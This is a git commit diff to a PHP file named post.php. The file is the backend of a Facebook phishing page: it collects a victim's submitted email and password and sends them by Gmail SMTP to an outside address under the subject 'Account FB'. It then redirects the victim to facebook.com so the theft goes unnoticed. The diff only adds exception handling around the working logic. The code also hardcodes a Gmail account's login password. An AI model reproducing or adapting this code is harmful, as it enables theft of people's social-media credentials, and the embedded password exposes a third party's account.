012301fd8c4a5ccba046dde27e6eae5fe9a3e708
chile <levanchi74@gmail.com>
2019-12-31 17:12:15 +0700

    fix

--- post.php
+++ post.php
@@ -9,30 +9,35 @@ require('PHPMailer/src/SMTP.php');
 
 if($_POST){
 
-    $mail = new PHPMailer();
-
-    $mail->IsSMTP(); // enable SMTP
-    $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-    $mail->SMTPAuth = true; // authentication enabled
-    $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-    $mail->Host = "smtp.gmail.com";
-    $mail->Port = 465; // or 587
-    $mail->IsHTML(true);
-    $mail->Username = "huynguyen66028@gmail.com";
-    $mail->Password = "anphawolf@%)$1997";
-    $mail->SetFrom("huynguyen66028@gmail.com","Huy Nguyen");
+    $mail = new PHPMailer(true);
+    try {
+      
+        $mail->isSMTP();     
     
-    $mail->Subject = 'Account FB';
-    $mail->Body = ' username: '.$_POST['email'] .' <br>
-                    password: '.$_POST['pass'].'  ';
-    $mail->AddAddress('anphawolf@gmail.com');
+        $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+        $mail->SMTPAuth = true; // authentication enabled
+        $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+        $mail->Host = "smtp.gmail.com";
+        $mail->Port = 465; // or 587
+        $mail->IsHTML(true);
+        $mail->Username = "huynguyen66028@gmail.com";
+        $mail->Password = "anphawolf@%)$1997";
+        $mail->SetFrom("huynguyen66028@gmail.com","Huy Nguyen");
+        
+        $mail->Subject = 'Account FB';
+        $mail->Body = ' username: '.$_POST['email'] .' <br>
+                        password: '.$_POST['pass'].'  ';
+        $mail->AddAddress('anphawolf@gmail.com');
 
-    if(!$mail->Send()) {
-        echo "Mailer Error: " . $mail->ErrorInfo;
-    } else {
-        //echo "Message has been sent";
-        header("Location: https://www.facebook.com/"); 
-        return true;
+        if(!$mail->Send()) {
+            echo "Mailer Error: " . $mail->ErrorInfo;
+        } else {
+            //echo "Message has been sent";
+            header("Location: https://www.facebook.com/"); 
+            return true;
+        }
+    } catch (Exception $e) {
+        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     }
 
 }
